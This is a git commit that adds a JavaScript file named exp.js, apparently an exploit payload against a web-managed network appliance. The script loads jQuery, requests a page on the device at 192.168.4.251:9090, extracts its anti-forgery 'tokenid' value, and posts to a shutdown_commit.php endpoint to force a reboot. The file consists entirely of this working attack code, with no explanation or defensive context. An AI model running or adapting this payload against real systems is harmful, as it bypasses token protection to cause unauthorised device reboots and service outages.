14d3a05fa05451e0c6065e71f0950fa992ff2302
hellohackerbaby <118070104+hellohackerbaby@users.noreply.github.com>
2023-03-03 09:50:02 +0800

    Create exp.js

---
+++ exp.js
@@ -0,0 +1,32 @@
+
+function loadScript(url){
+    var script = document.createElement("script");
+    script.type = "text/javascript";
+    script.src = url;
+    document.body.appendChild(script);
+}
+loadScript("https://libs.baidu.com/jquery/2.0.0/jquery.min.js");
+
+let vdata = null;
+setTimeout(test, 1000)
+function test(){
+    $(function(){
+        $.get("https://192.168.4.251:9090/top.php", function(data){
+            vdata = data;
+            var token = $(vdata).find("input[name=tokenid]")[0].value;
+            $.post('https://192.168.4.251:9090/view/systemConfig/reboot/shutdown_commit.php',
+                {
+                    tokenid: token,
+                    operation: 'on',
+                    rebootmode: '1',
+                    servicename: '',
+                    cfgsave: 'save'
+                },
+                function(data, status){
+                    console.log('Data: ' + data + '\nStatus: ' + status);
+                }
+            );
+
+    })});
+    
+}
